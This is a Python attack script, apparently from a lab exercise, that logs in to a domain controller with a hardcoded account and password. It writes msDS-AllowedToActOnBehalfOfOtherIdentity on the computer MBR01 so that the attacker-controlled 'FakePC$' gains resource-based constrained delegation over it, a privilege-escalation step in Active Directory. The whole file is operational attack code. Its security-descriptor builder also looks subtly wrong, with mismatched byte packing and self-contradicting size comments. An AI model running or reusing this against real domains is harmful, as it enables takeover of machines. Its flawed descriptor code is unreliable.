# WT007 RBCD set — write msDS-AllowedToActOnBehalfOfOtherIdentity on mbr01$ -> FakePC$
# via LDAPS + NTLM (works on ws01)
import struct
import sys
import uuid
import ldap3

DC = "dc02.child.cadre.local"
BASE = "DC=child,DC=cadre,DC=local"
USER = "child.cadre.local\\analyst_t1"
PASSWORD = "T13r_An@lyst!"
ATTACKER_SID_STR = "S-1-5-21-2616196951-1941128886-767624593-1121"  # FakePC$
TARGET_DN = "CN=MBR01,CN=Computers,DC=child,DC=cadre,DC=local"
RBCD_GUID = "3f78c3e5-f79a-46bd-a0b8-9d18116ddc79"  # msDS-AllowedToActOnBehalfOfOtherIdentity


def sid_to_binary(sid_str):
    parts = sid_str.split("-")
    rev = int(parts[1])
    auth = int(parts[2])
    subs = [int(x) for x in parts[3:]]
    if auth <= 0xFFFFFFFF:
        auth_bytes = struct.pack(">Q", auth)[2:]
    else:
        auth_bytes = struct.pack(">Q", auth)
    return bytes([rev, len(subs)]) + auth_bytes + b"".join(struct.pack("<I", s) for s in subs)


def build_rbcd_sd(attacker_sid_bin):
    # Self-relative SD with DACL containing one object ACE:
    #   type=ACCESS_ALLOWED_OBJECT_ACE, flags=ACE_OBJECT_TYPE_PRESENT,
    #   mask=DS_CONTROL_ACCESS (0x100), objectType=RBCD control-access GUID
    obj_guid = uuid.UUID(RBCD_GUID).bytes_le  # .NET/AD GUID binary layout
    ace_sid = attacker_sid_bin
    ace_size = 4 + 4 + 4 + 16 + len(ace_sid)  # header(12 incl mask? no) -> see below
    # OBJECT_ACE layout: type(1) flags(1) size(2) mask(4) flags(4) objecttype(16) sid(*)
    ace = b""
    ace += struct.pack("<BBI", 0x05, 0x00, 0)  # type=5 (object), flags=0, size placeholder
    ace += struct.pack("<I", 0x100)  # DS_CONTROL_ACCESS
    ace += struct.pack("<I", 0x1)  # ACE_OBJECT_TYPE_PRESENT
    ace += obj_guid
    ace += ace_sid
    ace_size_total = 4 + 4 + 16 + len(ace_sid)  # size field counts everything after size field
    ace = ace[:2] + struct.pack("<H", ace_size_total) + ace[4:]
    # DACL
    dacl_size = 8 + len(ace)  # header(8) + ace
    dacl = b""
    dacl += struct.pack("<BBH", 0x04, 0x00, 0)  # rev=4 (DS), sbz1, size placeholder
    dacl += struct.pack("<HH", 1, 0)  # ace count=1, sbz2
    dacl += ace
    dacl = dacl[:2] + struct.pack("<H", dacl_size) + dacl[4:]
    # SD header
    sd = b""
    sd += struct.pack("<BBH", 0x01, 0x00, 0x8004)  # rev, sbz1, control (DACL_PRESENT|SELF_RELATIVE)
    sd += struct.pack("<I", 0)  # owner offset
    sd += struct.pack("<I", 0)  # group offset
    sd += struct.pack("<I", 0)  # sacl offset
    sd += struct.pack("<I", 20)  # dacl offset
    sd += dacl
    return sd


att_sid_bin = sid_to_binary(ATTACKER_SID_STR)
sd_blob = build_rbcd_sd(att_sid_bin)

server = ldap3.Server("ldaps://" + DC, get_info=ldap3.ALL)
conn = ldap3.Connection(
    server,
    user=USER,
    password=PASSWORD,
    authentication=ldap3.NTLM,
    auto_bind=True,
)
conn.modify(TARGET_DN, {"msDS-AllowedToActOnBehalfOfOtherIdentity": [(ldap3.MODIFY_REPLACE, [sd_blob])]})
if conn.result["result"] == 0:
    print("RBCD_WRITE_OK")
else:
    print("RBCD_WRITE_FAIL", conn.result)
    sys.exit(1)

# verify read-back
conn.search(BASE, "(sAMAccountName=mbr01$)", attributes=["msDS-AllowedToActOnBehalfOfOtherIdentity"])
if conn.entries:
    val = conn.entries[0]["msDS-AllowedToActOnBehalfOfOtherIdentity"].value
    print("RBCD_VALUE_PRESENT", bool(val), "LEN", len(val) if val else 0)
conn.unbind()
